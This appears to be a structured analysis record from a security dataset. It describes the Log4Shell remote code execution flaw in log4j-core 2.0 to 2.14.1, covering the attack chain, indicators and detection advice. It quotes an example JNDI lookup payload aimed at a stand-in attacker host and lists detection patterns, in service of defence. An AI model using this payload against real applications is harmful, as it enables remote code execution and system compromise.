package_info.why_malicious: The affected versions of Log4j-core contain a critical remote code execution (RCE) vulnerability (CVE-2021-44228) that allows attackers to execute arbitrary code on any system using the library for logging, simply by sending specially crafted log messages. This is not due to intentional malice by the maintainers, but the vulnerability enables malicious exploitation at scale.

execution_context.trigger: runtime (whenever a log message is processed)

malicious_snippets.code_language: java (expression in log message, triggers Java JNDI lookup)
malicious_snippets.code_behavior: At runtime, when a log message containing a JNDI lookup pattern is processed, the code triggers a remote JNDI lookup to an attacker-controlled LDAP server, retrieves and executes a remote Java class, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger network requests and load/execute remote code, which is highly dangerous and not expected in normal logging operations.
malice_analysis.violated_expectations: Normal logging should only record messages, not interpret them as code or perform network lookups based on their content.
malice_analysis.similar_legitimate_use: JNDI lookups can be used for legitimate resource resolution in trusted, internal environments, but should never be exposed to untrusted input.
key_indicators: Use of ${jndi:...} patterns in log messages
Network requests initiated by log message content
Dynamic code loading from remote servers

attack_chain.action: Attacker sends a specially crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: Log4j processes the message and triggers a remote JNDI lookup.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server, retrieves a malicious Java class, and loads it.
attack_chain.leads_to: Arbitrary code execution on the vulnerable server.

attack_chain.action: The attacker's code executes with the permissions of the Java process, potentially exfiltrating data, installing malware, or taking control of the system.
attack_chain.leads_to: Full compromise of the affected system.

behavioral_signatures: Log messages containing ${jndi:ldap://...} or similar patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from Java applications
Dynamic class loading from remote servers triggered by log processing
file_indicators: Presence of vulnerable log4j-core JAR files (versions 2.0 - 2.14.1)
Application logs containing suspicious JNDI patterns
network_indicators: Outbound LDAP/RMI/HTTP requests to untrusted or external servers from Java applications
Connections to attacker infrastructure (e.g., attacker.com in example payloads)
detection_knowledge.how_to_detect: Monitor application logs for suspicious JNDI patterns (e.g., ${jndi:ldap://}), inspect network traffic for unexpected outbound LDAP/RMI/HTTP requests from Java processes, and scan for vulnerable log4j-core versions in application dependencies. Use IDS/IPS rules to detect exploit attempts and block suspicious network activity.
